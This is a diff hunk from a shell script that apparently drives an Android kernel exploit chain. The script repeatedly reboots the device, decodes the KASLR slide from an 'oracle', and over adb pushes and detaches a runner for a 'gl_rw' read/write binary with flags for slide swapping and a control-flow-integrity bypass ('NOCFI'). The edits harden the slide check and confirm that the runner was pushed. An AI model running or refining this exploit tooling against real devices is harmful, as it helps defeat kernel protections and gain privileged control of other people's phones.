@@ -33,16 +33,16 @@ for cycle in $(seq 1 $MAX); do
   echo "O-fire: boot_id=$BID uptime=$UP1"
   [ -z "$UP1" ] && { echo "O-fire crashed boot; settling"; sleep 100; continue; }
   SLIDE=$(python "$ROOT/tools/slide_decode.py" "$BID" 2>/dev/null | awk '{print $3}')
-  if [ "$SLIDE" = "None" ] || [ -z "$SLIDE" ]; then
-    echo "oracle miss; re-roll"
-    sleep 45; continue
-  fi
+  case "$SLIDE" in 0x*) ;; *) echo "oracle miss ($SLIDE); re-roll"; sleep 45; continue;; esac
   echo "SLIDE=$SLIDE (redirect live)"
 
   # ---- N-fire: swap + HOLD, detached ----
   printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE_SWAP=1\nexport KASLR_SLIDE=%s\nexport MODE4_SWAP_NOCFI=1\nexport MODE4_SWAP_HOLD=1\ncd /data/local/tmp\nexec /data/local/tmp/gl_rw\n' "$SLIDE" > /tmp/gl_n.sh
-  adb push /tmp/gl_n.sh /data/local/tmp/glr.sh >/dev/null 2>&1
-  adb shell "tr -d '\\r' < /data/local/tmp/glr.sh > /data/local/tmp/glrr.sh; chmod 755 /data/local/tmp/glrr.sh; rm -f /data/local/tmp/gl_out.txt; nohup /data/local/tmp/glrr.sh > /data/local/tmp/gl_out.txt 2>&1 &" >/dev/null 2>&1
+  adb push /tmp/gl_n.sh /data/local/tmp/glr_raw.sh >/dev/null 2>&1
+  adb shell "tr -d '\\r' < /data/local/tmp/glr_raw.sh > /data/local/tmp/glrr.sh && chmod 755 /data/local/tmp/glrr.sh && rm -f /data/local/tmp/gl_out.txt && nohup /data/local/tmp/glrr.sh > /data/local/tmp/gl_out.txt 2>&1 &" >/dev/null 2>&1
+  sleep 2
+  LS=$(adb shell "ls /data/local/tmp/glrr.sh 2>&1" | tr -d '\r')
+  case "$LS" in *glrr.sh*) ;; *) echo "runner missing: $LS"; sleep 45; continue;; esac
 
   # ---- poll for HOLD (walk done, swap live) ----
   HOLD=""
